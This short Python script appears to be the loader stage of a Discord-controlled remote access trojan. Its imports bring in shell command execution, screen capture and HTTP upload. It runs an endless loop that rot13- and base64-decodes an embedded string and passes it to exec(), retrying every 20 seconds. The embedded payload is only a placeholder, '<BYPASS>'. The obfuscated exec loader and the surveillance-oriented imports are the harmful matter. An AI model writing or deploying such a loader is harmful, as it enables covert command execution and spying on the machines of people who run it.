from time import sleep
from discord.ext.commands import Bot
from base64 import b64decode, b32decode
import codecs
from os import popen, system, chdir, remove, getcwd
from os.path import getsize
from random import randint
from requests import put, get
from discord import File
from pyautogui import screenshot
from sys import version_info

while True:
    try:
        secert = "<BYPASS>"
        unsecret = codecs.encode(secert, 'rot13')
        exec(b64decode({2:str, 3:lambda b:bytes(b, 'UTF-8')}[version_info[0]](unsecret)))
    except:
        print("no code")
        sleep(20)
